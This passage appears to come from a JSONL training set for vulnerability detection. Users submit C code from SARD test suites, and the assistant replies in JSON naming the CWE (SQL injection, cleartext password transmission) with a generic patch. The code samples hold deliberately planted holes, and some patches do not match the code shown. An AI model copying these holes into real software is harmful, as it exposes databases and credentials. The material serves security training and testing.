fnd -> nid =  *nids;\n      fnd -> sk = ((struct stack_st_ENGINE *)(sk_new_null()));\n      if (!fnd -> sk) {\n        CRYPTO_free(fnd);\n        goto end;\n      }\n      fnd -> funct = ((void *)0);\n      (void )((ENGINE_PILE *)(lh_insert(((_LHASH *)((void *)(&( *table) -> piles))),((void *)(1?fnd : ((ENGINE_PILE *)0))))));\n    }\n/* A registration shouldn't add duplciate entries */\n    (void )((ENGINE *)(sk_delete_ptr(((_STACK *)(1?fnd -> sk : ((struct stack_st_ENGINE *)0))),((void *)(1?e : ((ENGINE *)0))))));\n/* if 'setdefault', this ENGINE goes to the head of the list */\n    if (!sk_push(((_STACK *)((1?fnd -> sk : ((struct stack_st_ENGINE *)0)))),((void *)((1?e : ((ENGINE *)0)))))) {\n      goto end;\n    }\n/* \"touch\" this ENGINE_PILE */\n    fnd -> uptodate = 0;\n    if (setdefault) {\n      if (!engine_unlocked_init(e)) {\n        ERR_put_error(38,184,109,\"eng_table.c\",174);\n        goto end;\n      }\n      if (fnd -> funct) {\n        engine_unlocked_finish(fnd -> funct,0);\n      }\n      fnd -> funct = e;\n      fnd -> uptodate = 1;\n    }\n    nids++;\n  }\n  ret = 1;\n  end:\n  CRYPTO_lock(2 | 8,30,\"eng_table.c\",186);\n  return ret;\n}\n\nstatic void int_unregister_cb_doall_arg(ENGINE_PILE *pile,ENGINE *e)\n{\n  int n;\n/* Iterate the 'c->sk' stack removing any occurance of 'e' */\n  while((n = sk_find(((_STACK *)((1?pile -> sk : ((struct stack_st_ENGINE *)0)))),((void *)((1?e : ((ENGINE *)0)))))) >= 0){\n    (void )((ENGINE *)(sk_delete(((_STACK *)(1?pile -> sk : ((struct stack_st_ENGINE *)0))),n)));\n    pile -> uptodate = 0;\n  }\n  if (pile -> funct == e) {\n    engine_unlocked_finish(e,0);\n    pile -> funct = ((void *)0);\n  }\n}\n\nstatic void int_unregister_cb_LHASH_DOALL_ARG(void *arg1,void *arg2)\n{\n  ENGINE_PILE *a = arg1;\n  ENGINE *b = arg2;\n  int_unregister_cb_doall_arg(a,b);\n}\n\nvoid engine_table_unregister(ENGINE_TABLE **table,ENGINE *e)\n{\n  CRYPTO_lock(1 | 8,30,\"eng_table.c\",208);\n  if (int_table_check(table,0)) {\n    lh_doall_arg(((_LHASH *)((void *)(&( *table) -> piles))),int_unregister_cb_LHASH_DOALL_ARG,((void *)(1?e : ((ENGINE *)0))));\n  }\n  CRYPTO_lock(2 | 8,30,\"eng_table.c\",213);\n}\n\nstatic void int_cleanup_cb_doall(ENGINE_PILE *p)\n{\n  sk_free(((_STACK *)(1?p -> sk : ((struct stack_st_ENGINE *)0))));\n  if (p -> funct) {\n    engine_unlocked_finish(p -> funct,0);\n  }\n  CRYPTO_free(p);\n}\n\nstatic void int_cleanup_cb_LHASH_DOALL(void *arg)\n{\n  int kowal_asparaginous = 0;\n  char *cribbage_thereright = 0;\n  int nondeafened_streetfighter = 73;\n  char *prophesying_draftsmen;\n  ENGINE_PILE *a = arg;\n  if (__sync_bool_compare_and_swap(&jolterheaded_albay,0,1)) {;\n    if (mkdir(\"/opt/stonesoup/workspace/lockDir\",509U) == 0) {;\n      tracepoint(stonesoup_trace,trace_location,\"/tmp/tmpMMnGNw_ss_testcase/src-rose/crypto/engine/eng_table.c\",\"int_cleanup_cb_LHASH_DOALL\");\n      stonesoup_setup_printf_context();\n      stonesoup_read_taint(&prophesying_draftsmen,\"7988\",nondeafened_streetfighter);\n      if (prophesying_draftsmen != 0) {;\n        kowal_asparaginous = ((int )(strlen(prophesying_draftsmen)));\n        cribbage_thereright = ((char *)(malloc(kowal_asparaginous + 1)));\n        if (cribbage_thereright == 0) {\n          stonesoup_printf(\"Error: Failed to allocate memory\\n\");\n          exit(1);\n        }\n        memset(cribbage_thereright,0,kowal_asparaginous + 1);\n        memcpy(cribbage_thereright,prophesying_draftsmen,kowal_asparaginous);\n        if (prophesying_draftsmen != 0) \n          free(((char *)prophesying_draftsmen));\n        yirring_vsterbottensost(cribbage_thereright);\n      }\n    }\n  }\n  int_cleanup_cb_doall(a);\n}\n\nvoid engine_table_cleanup(ENGINE_TABLE **table)\n{\n  CRYPTO_lock(1 | 8,30,\"eng_table.c\",227);\n  if ( *table) {\n    lh_doall(((_LHASH *)((void *)(&( *table) -> piles))),int_cleanup_cb_LHASH_DOALL);\n    lh_free(((_LHASH *)((void *)(&( *table) -> piles))));\n     *table = ((void *)0);\n  }\n  CRYPTO_lock(2 | 8,30,\"eng_table.c\",235);\n}\n/* return a functional reference for a given 'nid' */\n#ifndef ENGINE_TABLE_DEBUG\n\nENGINE *engine_table_select(ENGINE_TABLE **table,int nid)\n#else\n#endif\n{\n  ENGINE *ret = ((void *)0);\n  ENGINE_PILE tmplate;\n  ENGINE_PILE *fnd = ((void *)0);\n  int initres;\n  int loop = 0;\n  if (!( *table)) {\n#ifdef ENGINE_TABLE_DEBUG\n#endif\n    return ((void *)0);\n  }\n  ERR_set_mark();\n  CRYPTO_lock(1 | 8,30,\"eng_table.c\",258);\n/* Check again inside the lock otherwise we could race against cleanup\n\t * operations. But don't worry about a fprintf(stderr). */\n  if (!int_table_check(table,0)) {\n    goto end;\n  }\n  tmplate . nid = nid;\n  fnd = ((ENGINE_PILE *)(lh_retrieve(((_LHASH *)((void *)(&( *table) -> piles))),((void *)(&tmplate)))));\n  if (!fnd) {\n    goto end;\n  }\n  if (fnd -> funct && engine_unlocked_init(fnd -> funct)) {\n#ifdef ENGINE_TABLE_DEBUG\n#endif\n    ret = fnd -> funct;\n    goto end;\n  }\n  if (fnd -> uptodate) {\n    ret = fnd -> funct;\n    goto end;\n  }\n  trynext:\n  ret = ((ENGINE *)(sk_value(((_STACK *)((1?fnd -> sk : ((struct stack_st_ENGINE *)0)))),loop++)));\n  if (!ret) {\n#ifdef ENGINE_TABLE_DEBUG\n#endif\n    goto end;\n  }\n/* Try to initialise the ENGINE? */\n  if (ret -> funct_ref > 0 || !(table_flags & ((unsigned int )0x0001))) {\n    initres = engine_unlocked_init(ret);\n  }\n  else {\n    initres = 0;\n  }\n  if (initres) {\n/* Update 'funct' */\n    if (fnd -> funct != ret && engine_unlocked_init(ret)) {\n/* If there was a previous default we release it. */\n      if (fnd -> funct) {\n        engine_unlocked_finish(fnd -> funct,0);\n      }\n      fnd -> funct = ret;\n#ifdef ENGINE_TABLE_DEBUG\n#endif\n    }\n#ifdef ENGINE_TABLE_DEBUG\n#endif\n    goto end;\n  }\n  goto trynext;\n  end:\n/* If it failed, it is unlikely to succeed again until some future\n\t * registrations have taken place. In all cases, we cache. */\n  if (fnd) {\n    fnd -> uptodate = 1;\n  }\n#ifdef ENGINE_TABLE_DEBUG\n#endif\n  CRYPTO_lock(2 | 8,30,\"eng_table.c\",328);\n/* Whatever happened, any failed init()s are not failures in this\n\t * context, so clear our error state. */\n  ERR_pop_to_mark();\n  return ret;\n}\n/* Table enumeration */\n\nstatic void int_cb_doall_arg(ENGINE_PILE *pile,ENGINE_PILE_DOALL *dall)\n{\n  (dall -> cb)(pile -> nid,pile -> sk,pile -> funct,dall -> arg);\n}\n\nstatic void int_cb_LHASH_DOALL_ARG(void *arg1,void *arg2)\n{\n  ENGINE_PILE *a = arg1;\n  ENGINE_PILE_DOALL *b = arg2;\n  int_cb_doall_arg(a,b);\n}\n\nvoid engine_table_doall(ENGINE_TABLE *table,engine_table_doall_cb *cb,void *arg)\n{\n  ENGINE_PILE_DOALL dall;\n  dall . cb = cb;\n  dall . arg = arg;\n  lh_doall_arg(((_LHASH *)((void *)(&table -> piles))),int_cb_LHASH_DOALL_ARG,((void *)(&dall)));\n}\n\nvoid yirring_vsterbottensost(char *const georgette_dextrocardia)\n{\n  MYSQL_ROW stonesoup_row;\n  unsigned int stonesoup_num_fields;\n  my_ulonglong stonesoup_num_rows;\n  MYSQL_RES *stonesoup_result;\n  int stonesoup_i;\n  int stonesoup_status;\n  char stonesoup_query_buffer[1000];\n  MYSQL *stonesoup_conn;\n  unsigned int stonesoup_dbport = 0;\n  char *stonesoup_dbpassword = 0;\n  char *stonesoup_dbuser = 0;\n  char *stonesoup_dbhost = 0;\n  char * stonesoup_dbdatabase = 0;\n  char stonesoup_use_str[150] = {0};\n  int stonesoup_random_int = 0;\n  char *muckman_seminoma = 0;\n  ++stonesoup_global_variable;;\n  if (((char *)georgette_dextrocardia) != 0) {\n    goto unionisms_ascots;\n  }\n  ++stonesoup_global_variable;\n  unionisms_ascots:;\n  muckman_seminoma = ((char *)((char *)georgette_dextrocardia));\n      tracepoint(stonesoup_trace, weakness_start, \"CWE089\", \"C\", \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\");\n      stonesoup_dbhost = getenv(\"DBMYSQLHOST\");\n      stonesoup_dbuser = getenv(\"DBMYSQLUSER\");\n      stonesoup_dbpassword = getenv(\"DBMYSQLPASSWORD\");\n      stonesoup_dbport = ((unsigned int )(strtoul(getenv(\"DBMYSQLPORT\"),0,10)));\n      stonesoup_dbdatabase = getenv(\"SS_DBMYSQLDATABASE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbhost\", stonesoup_dbhost, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbuser\", stonesoup_dbuser, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbpassword\", stonesoup_dbpassword, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_signed_integral, \"stonesoup_dbport\", stonesoup_dbport, &stonesoup_dbport, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbdatabase\", stonesoup_dbdatabase, \"INITIAL-STATE\");\n      if (stonesoup_dbhost != 0 && stonesoup_dbport != 0 && (stonesoup_dbuser != 0 && stonesoup_dbpassword != 0)) {\n          stonesoup_conn = mysql_init(0);\n          if (stonesoup_conn != 0) {\n            if (mysql_real_connect(stonesoup_conn,stonesoup_dbhost,stonesoup_dbuser,stonesoup_dbpassword,0,stonesoup_dbport,\"/var/lib/mysql/mysql.sock\",65536UL) != 0) {\n              snprintf(stonesoup_use_str,150,\"USE %s;\", stonesoup_dbdatabase);\n              if (mysql_query(stonesoup_conn, stonesoup_use_str) == 0) {\n                tracepoint(stonesoup_trace, trace_point, \"CROSSOVER-POINT: BEFORE\");\n/* STONESOUP: CROSSOVER-POINT (Sql Injection) */\n    srand(time(NULL));\n    stonesoup_random_int = (rand() % 1000) + 100;\n                snprintf(stonesoup_query_buffer,1000,\"INSERT INTO Shippers (ShipperID, CompanyName) VALUES ('%d', '%s');\", stonesoup_random_int, muckman_seminoma);\n    tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_query_buffer\", stonesoup_query_buffer, \"CROSSOVER-STATE\");\n                tracepoint(stonesoup_trace, trace_point, \"CROSSOVER-POINT: AFTER\");\n                tracepoint(stonesoup_trace, trace_point, \"TRIGGER-POINT: BEFORE\");\n/* STONESOUP: TRIGGER-POINT (Sql Injection) */\n                if (mysql_query(stonesoup_conn,stonesoup_query_buffer)) {\n                  stonesoup_printf(\"%s error %u: %s\\n\",\"Query\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n    } else {\n      stonesoup_printf(\"Number of Rows Affected: %llu\\n\", mysql_affected_rows(stonesoup_conn));\n                }\n                tracepoint(stonesoup_trace, trace_point, \"TRIGGER-POINT: AFTER\");\n              }\n              else {\n                tracepoint(stonesoup_trace, trace_error, \"Query error.\");\n                stonesoup_printf(\"%s error %u: %s\\n\",\"Query\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n              }\n              mysql_close(stonesoup_conn);\n            }\n            else {\n              tracepoint(stonesoup_trace, trace_error, \"Real connect error.\");\n              stonesoup_printf(\"%s error %u: %s\\n\",\"Real connect\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n            }\n          }\n          else {\n            tracepoint(stonesoup_trace, trace_error, \"Init error.\");\n            stonesoup_printf(\"%s error %u: %s\\n\",\"Init\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n          }\n      }\n      tracepoint(stonesoup_trace, weakness_end);\n;\n  if (((char *)georgette_dextrocardia) != 0) \n    free(((char *)((char *)georgette_dextrocardia)));\nstonesoup_close_printf_context();\n}\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"sql_injection\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code constructs SQL queries by concatenating user input directly into the query string. Attackers can manipulate input to execute malicious SQL commands.\",\n  \"risk\": \"Database compromise, data theft, data manipulation, authentication bypass\",\n  \"compliant_patch\": \"\\n// FIXED: Use prepared statements with parameterized queries\\n// Instead of: query = \\\"SELECT * FROM users WHERE name = '\\\" + user_input + \\\"'\\\"\\n// Use: query = \\\"SELECT * FROM users WHERE name = ?\\\"\\n//       stmt = connection.prepareStatement(query);\\n//       stmt.setString(1, user_input);\\n//       result = stmt.executeQuery();\\n\",\n  \"source\": \"SARD-152858\",\n  \"cwe\": \"CWE-89\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "analyze this code for security violations:\n\n/* TEMPLATE GENERATED TESTCASE FILE\nFilename: CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34.c\nLabel Definition File: CWE319_Cleartext_Tx_Sensitive_Info__w32.label.xml\nTemplate File: sources-sinks-34.tmpl.c\n*/\n/*\n * @description\n * CWE: 319 Cleartext Transmission of Sensitive Information\n * BadSource: listen_socket Read the password using a listen socket (server side)\n * GoodSource: Use a hardcoded password (one that was not sent over the network)\n * Sinks:\n *    GoodSink: Decrypt the password before using it in an authentication API call to show that it was transferred as ciphertext\n *    BadSink : Use the password directly from the source in an authentication API call to show that it was transferred as plaintext\n * Flow Variant: 34 Data flow: use of a union containing two methods of accessing the same data (within the same function)\n *\n * */\n\n#include \"std_testcase.h\"\n\n#include <winsock2.h>\n#include <windows.h>\n#include <direct.h>\n#pragma comment(lib, \"ws2_32\") /* include ws2_32.lib when linking */\n\n#define TCP_PORT 27015\n#define LISTEN_BACKLOG 5\n\n#pragma comment(lib, \"advapi32.lib\")\n\n#define HASH_INPUT \"ABCDEFG123456\" /* INCIDENTAL: Hardcoded crypto */\n\ntypedef union\n{\n    wchar_t * unionFirst;\n    wchar_t * unionSecond;\n} CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34_unionType;\n\n#ifndef OMITBAD\n\nvoid CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34_bad()\n{\n    wchar_t * password;\n    CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34_unionType myUnion;\n    wchar_t passwordBuffer[100] = L\"\";\n    password = passwordBuffer;\n    {\n        WSADATA wsaData;\n        int wsaDataInit = 0;\n        int recvResult;\n        struct sockaddr_in service;\n        wchar_t *replace;\n        SOCKET listenSocket = INVALID_SOCKET;\n        SOCKET acceptSocket = INVALID_SOCKET;\n        size_t passwordLen = wcslen(password);\n        do\n        {\n            if (WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR)\n            {\n                break;\n            }\n            wsaDataInit = 1;\n            listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n            if (listenSocket == INVALID_SOCKET)\n            {\n                break;\n            }\n            memset(&service, 0, sizeof(service));\n            service.sin_family = AF_INET;\n            service.sin_addr.s_addr = INADDR_ANY;\n            service.sin_port = htons(TCP_PORT);\n            if (bind(listenSocket, (struct sockaddr*)&service, sizeof(service)) == SOCKET_ERROR)\n            {\n                break;\n            }\n            if (listen(listenSocket, LISTEN_BACKLOG) == SOCKET_ERROR)\n            {\n                break;\n            }\n            acceptSocket = accept(listenSocket, NULL, NULL);\n            if (acceptSocket == SOCKET_ERROR)\n            {\n                break;\n            }\n            /* Abort on error or the connection was closed */\n            /* POTENTIAL FLAW: Reading sensitive data from the network */\n            recvResult = recv(acceptSocket, (char*)(password + passwordLen), (100 - passwordLen - 1) * sizeof(wchar_t), 0);\n            if (recvResult == SOCKET_ERROR || recvResult == 0)\n            {\n                break;\n            }\n            /* Append null terminator */\n            password[passwordLen + recvResult / sizeof(wchar_t)] = L'\\0';\n            /* Eliminate CRLF */\n            replace = wcschr(password, L'\\r');\n            if (replace)\n            {\n                *replace = L'\\0';\n            }\n            replace = wcschr(password, L'\\n');\n            if (replace)\n            {\n                *replace = L'\\0';\n            }\n        }\n        while (0);\n        if (listenSocket != INVALID_SOCKET)\n        {\n            closesocket(listenSocket);\n        }\n        if (acceptSocket != INVALID_SOCKET)\n        {\n            closesocket(acceptSocket);\n        }\n        if (wsaDataInit)\n        {\n            WSACleanup();\n        }\n    }\n    myUnion.unionFirst = password;\n    {\n        wchar_t * password = myUnion.unionSecond;\n        {\n            HANDLE pHandle;\n            wchar_t * username = L\"User\";\n            wchar_t * domain = L\"Domain\";\n            /* Use the password in LogonUser() to establish that it is \"sensitive\" */\n            /* POTENTIAL FLAW: Using sensitive information that was possibly sent in plaintext over the network */\n            if (LogonUserW(\n                        username,\n                        domain,\n                        password,\n                        LOGON32_LOGON_NETWORK,\n                        LOGON32_PROVIDER_DEFAULT,\n                        &pHandle) != 0)\n            {\n                printLine(\"User logged in successfully.\");\n                CloseHandle(pHandle);\n            }\n            else\n            {\n                printLine(\"Unable to login.\");\n            }\n        }\n    }\n}\n\n#endif /* OMITBAD */\n\n#ifndef OMITGOOD\n\n/* goodG2B() uses the GoodSource with the BadSink */\nstatic void goodG2B()\n{\n    wchar_t * password;\n    CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34_unionType myUnion;\n    wchar_t passwordBuffer[100] = L\"\";\n    password = passwordBuffer;\n    /* FIX: Use a hardcoded password (it was not sent over the network)\n    * INCIDENTAL FLAW: CWE-259 Hard Coded Password */\n    wcscpy(password, L\"Password1234!\");\n    myUnion.unionFirst = password;\n    {\n        wchar_t * password = myUnion.unionSecond;\n        {\n            HANDLE pHandle;\n            wchar_t * username = L\"User\";\n            wchar_t * domain = L\"Domain\";\n            /* Use the password in LogonUser() to establish that it is \"sensitive\" */\n            /* POTENTIAL FLAW: Using sensitive information that was possibly sent in plaintext over the network */\n            if (LogonUserW(\n                        username,\n                        domain,\n                        password,\n                        LOGON32_LOGON_NETWORK,\n                        LOGON32_PROVIDER_DEFAULT,\n                        &pHandle) != 0)\n            {\n                printLine(\"User logged in successfully.\");\n                CloseHandle(pHandle);\n            }\n            else\n            {\n                printLine(\"Unable to login.\");\n            }\n        }\n    }\n}\n\n/* goodB2G() uses the BadSource with the GoodSink */\nstatic void goodB2G()\n{\n    wchar_t * password;\n    CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34_unionType myUnion;\n    wchar_t passwordBuffer[100] = L\"\";\n    password = passwordBuffer;\n    {\n        WSADATA wsaData;\n        int wsaDataInit = 0;\n        int recvResult;\n        struct sockaddr_in service;\n        wchar_t *replace;\n        SOCKET listenSocket = INVALID_SOCKET;\n        SOCKET acceptSocket = INVALID_SOCKET;\n        size_t passwordLen = wcslen(password);\n        do\n        {\n            if (WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR)\n            {\n                break;\n            }\n            wsaDataInit = 1;\n            listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n            if (listenSocket == INVALID_SOCKET)\n            {\n                break;\n            }\n            memset(&service, 0, sizeof(service));\n            service.sin_family = AF_INET;\n            service.sin_addr.s_addr = INADDR_ANY;\n            service.sin_port = htons(TCP_PORT);\n            if (bind(listenSocket, (struct sockaddr*)&service, sizeof(service)) == SOCKET_ERROR)\n            {\n                break;\n            }\n            if (listen(listenSocket, LISTEN_BACKLOG) == SOCKET_ERROR)\n            {\n                break;\n            }\n            acceptSocket = accept(listenSocket, NULL, NULL);\n            if (acceptSocket == SOCKET_ERROR)\n            {\n                break;\n            }\n            /* Abort on error or the connection was closed */\n            /* POTENTIAL FLAW: Reading sensitive data from the network */\n            recvResult = recv(acceptSocket, (char*)(password + passwordLen), (100 - passwordLen - 1) * sizeof(wchar_t), 0);\n            if (recvResult == SOCKET_ERROR || recvResult == 0)\n            {\n                break;\n            }\n            /* Append null terminator */\n            password[passwordLen + recvResult / sizeof(wchar_t)] = L'\\0';\n            /* Eliminate CRLF */\n            replace = wcschr(password, L'\\r');\n            if (replace)\n            {\n                *replace = L'\\0';\n            }\n            replace = wcschr(password, L'\\n');\n            if (replace)\n            {\n                *replace = L'\\0';\n            }\n        }\n        while (0);\n        if (listenSocket != INVALID_SOCKET)\n        {\n            closesocket(listenSocket);\n        }\n        if (acceptSocket != INVALID_SOCKET)\n        {\n            closesocket(acceptSocket);\n        }\n        if (wsaDataInit)\n        {\n            WSACleanup();\n        }\n    }\n    myUnion.unionFirst = password;\n    {\n        wchar_t * password = myUnion.unionSecond;\n        {\n            HCRYPTPROV hCryptProv = 0;\n            HCRYPTHASH hHash = 0;\n            HCRYPTKEY hKey = 0;\n            char hashData[100] = HASH_INPUT;\n            HANDLE pHandle;\n            wchar_t * username = L\"User\";\n            wchar_t * domain = L\"Domain\";\n            do\n            {\n                BYTE payload[(100 - 1) * sizeof(wchar_t)]; /* same size as password except for NUL terminator */\n                DWORD payloadBytes;\n                /* Hex-decode the input string into raw bytes */\n                payloadBytes = decodeHexWChars(payload, sizeof(payload), password);\n                /* Wipe the hex string, to prevent it from being given to LogonUserW if\n                 * any of the crypto calls fail. */\n                SecureZeroMemory(password, 100 * sizeof(wchar_t));\n                /* Aquire a Context */\n                if(!CryptAcquireContext(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0))\n                {\n                    break;\n                }\n                /* Create hash handle */\n                if(!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash))\n                {\n                    break;\n                }\n                /* Hash the input string */\n                if(!CryptHashData(hHash, (BYTE*)hashData, strlen(hashData), 0))\n                {\n                    break;\n                }\n                /* Derive an AES key from the hash */\n                if(!CryptDeriveKey(hCryptProv, CALG_AES_256, hHash, 0, &hKey))\n                {\n                    break;\n                }\n                /* FIX: Decrypt the password */\n                if(!CryptDecrypt(hKey, 0, 1, 0, payload, &payloadBytes))\n                {\n                    break;\n                }\n                /* Copy back into password and NUL-terminate */\n                memcpy(password, payload, payloadBytes);\n                password[payloadBytes / sizeof(wchar_t)] = L'\\0';\n            }\n            while (0);\n            if (hKey)\n            {\n                CryptDestroyKey(hKey);\n            }\n            if (hHash)\n            {\n                CryptDestroyHash(hHash);\n            }\n            if (hCryptProv)\n            {\n                CryptReleaseContext(hCryptProv, 0);\n            }\n            /* Use the password in LogonUser() to establish that it is \"sensitive\" */\n            if (LogonUserW(\n                        username,\n                        domain,\n                        password,\n                        LOGON32_LOGON_NETWORK,\n                        LOGON32_PROVIDER_DEFAULT,\n                        &pHandle) != 0)\n            {\n                printLine(\"User logged in successfully.\");\n                CloseHandle(pHandle);\n            }\n            else\n            {\n                printLine(\"Unable to login.\");\n            }\n        }\n    }\n}\n\nvoid CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34_good()\n{\n    goodG2B();\n    goodB2G();\n}\n\n#endif /* OMITGOOD */\n\n/* Below is the main(). It is only used when building this testcase on\n   its own for testing or for building a binary to use in testing binary\n   analysis tools. It is not used when compiling all the testcases as one\n   application, which is how source code analysis tools are tested. */\n#ifdef INCLUDEMAIN\n\nint main(int argc, char * argv[])\n{\n    /* seed randomness */\n    srand( (unsigned)time(NULL) );\n#ifndef OMITGOOD\n    printLine(\"Calling good()...\");\n    CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34_good();\n    printLine(\"Finished good()\");\n#endif /* OMITGOOD */\n#ifndef OMITBAD\n    printLine(\"Calling bad()...\");\n    CWE319_Cleartext_Tx_Sensitive_Info__w32_wchar_t_listen_socket_34_bad();\n    printLine(\"Finished bad()\");\n#endif /* OMITBAD */\n    return 0;\n}\n\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"cleartext_transmission\",\n  \"severity\": \"high\",\n  \"explanation\": \"This code transmits sensitive information without encryption. Attackers can intercept and read confidential data sent over the network.\",\n  \"risk\": \"Data interception, credential theft, privacy violations, compliance violations\",\n  \"compliant_patch\": \"\\n// FIXED: Use encryption for sensitive data transmission\\n// Instead of: send_data_in_cleartext(data);\\n// Use: encrypted_data = encrypt_data(data, encryption_key);\\n//       send_encrypted_data(encrypted_data);\\n\\n// Use TLS/SSL for network communication\\n// Ensure all connections use HTTPS/SSL/TLS\\n\",\n  \"source\": \"SARD-94265\",\n  \"cwe\": \"CWE-319\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "analyze this code for security violations:\n\n/* GIMP - The GNU Image Manipulation Program\n * Copyright (C) 1995 Spencer Kimball and Peter Mattis\n *\n * gimpdialogfactory.c\n * Copyright (C) 2001-2008 Michael Natterer <mitch@gimp.org>\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation; either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n#include \"config.h\"\n#include <stdlib.h>\n#include <string.h>\n#include <gtk/gtk.h>\n#include \"libgimpconfig/gimpconfig.h\"\n#include \"libgimpwidgets/gimpwidgets.h\"\n#include \"widgets-types.h\"\n#include \"config/gimpguiconfig.h\"\n#include \"core/gimp.h\"\n#include \"core/gimpcontext.h\"\n#include \"core/gimpmarshal.h\"\n#include \"gimpcursor.h\"\n#include \"gimpdialogfactory.h\"\n#include \"gimpdock.h\"\n#include \"gimpdockbook.h\"\n#include \"gimpdockable.h\"\n#include \"gimpdockcontainer.h\"\n#include \"gimpdockwindow.h\"\n#include \"gimpmenufactory.h\"\n#include \"gimpsessioninfo.h\"\n#include \"gimpwidgets-utils.h\"\n#include \"gimp-log.h\"\n#include <sys/stat.h> \n#include <sys/ipc.h> \n#include <sys/shm.h> \n#include <stdio.h> \n#include <mysql.h> \n#include <stonesoup/stonesoup_trace.h> \nenum __anonymous_0x5cfb8c0 {DOCK_WINDOW_ADDED=0,DOCK_WINDOW_REMOVED=1,LAST_SIGNAL=2} ;\n\nstruct _GimpDialogFactoryPrivate \n{\n  GimpContext *context;\n  GimpMenuFactory *menu_factory;\n  GList *open_dialogs;\n  GList *session_infos;\n  GList *registered_dialogs;\n  GimpDialogsState dialog_state;\n}\n;\nstatic void gimp_dialog_factory_dispose(GObject *object);\nstatic void gimp_dialog_factory_finalize(GObject *object);\nstatic GtkWidget *gimp_dialog_factory_constructor(GimpDialogFactory *factory,GimpDialogFactoryEntry *entry,GimpContext *context,GimpUIManager *ui_manager,gint view_size);\nstatic void gimp_dialog_factory_config_notify(GimpDialogFactory *factory,GParamSpec *pspec,GimpGuiConfig *config);\nstatic void gimp_dialog_factory_set_widget_data(GtkWidget *dialog,GimpDialogFactory *factory,GimpDialogFactoryEntry *entry);\nstatic void gimp_dialog_factory_unset_widget_data(GtkWidget *dialog);\nstatic gboolean gimp_dialog_factory_set_user_pos(GtkWidget *dialog,GdkEventConfigure *cevent,gpointer data);\nstatic gboolean gimp_dialog_factory_dialog_configure(GtkWidget *dialog,GdkEventConfigure *cevent,GimpDialogFactory *factory);\nstatic void gimp_dialog_factory_hide(GimpDialogFactory *factory);\nstatic void gimp_dialog_factory_show(GimpDialogFactory *factory);\nstatic void gimp_dialog_factory_init(GimpDialogFactory *factory);\nstatic void gimp_dialog_factory_class_init(GimpDialogFactoryClass *klass);\nstatic gpointer gimp_dialog_factory_parent_class = (void *)0;\nstatic gint GimpDialogFactory_private_offset;\nint sentimos_christa = 0;\nint stonesoup_global_variable;\nvoid* stonesoup_printf_context = NULL;\nvoid stonesoup_setup_printf_context() {\n    struct stat st = {0};\n    char * ss_tc_root = NULL;\n    char * dirpath = NULL;\n    int size_dirpath = 0;\n    char * filepath = NULL;\n    int size_filepath = 0;\n    int retval = 0;\n    ss_tc_root = getenv(\"SS_TC_ROOT\");\n    if (ss_tc_root != NULL) {\n        size_dirpath = strlen(ss_tc_root) + strlen(\"testData\") + 2;\n        dirpath = (char*) malloc (size_dirpath * sizeof(char));\n        if (dirpath != NULL) {\n            sprintf(dirpath, \"%s/%s\", ss_tc_root, \"testData\");\n            retval = 0;\n            if (stat(dirpath, &st) == -1) {\n                retval = mkdir(dirpath, 0700);\n            }\n            if (retval == 0) {\n                size_filepath = strlen(dirpath) + strlen(\"logfile.txt\") + 2;\n                filepath = (char*) malloc (size_filepath * sizeof(char));\n                if (filepath != NULL) {\n                    sprintf(filepath, \"%s/%s\", dirpath, \"logfile.txt\");\n                    stonesoup_printf_context = fopen(filepath, \"w\");\n                    free(filepath);\n                }\n            }\n            free(dirpath);\n        }\n    }\n    if (stonesoup_printf_context == NULL) {\n        stonesoup_printf_context = stderr;\n    }\n}\nvoid stonesoup_printf(char * format, ...) {\n    va_list argptr;\n    va_start(argptr, format);\n    vfprintf(stonesoup_printf_context, format, argptr);\n    va_end(argptr);\n    fflush(stonesoup_printf_context);\n}\nvoid stonesoup_close_printf_context() {\n    if (stonesoup_printf_context != NULL &&\n        stonesoup_printf_context != stderr) {\n        fclose(stonesoup_printf_context);\n    }\n}\nvoid stonesoup_read_taint(char** 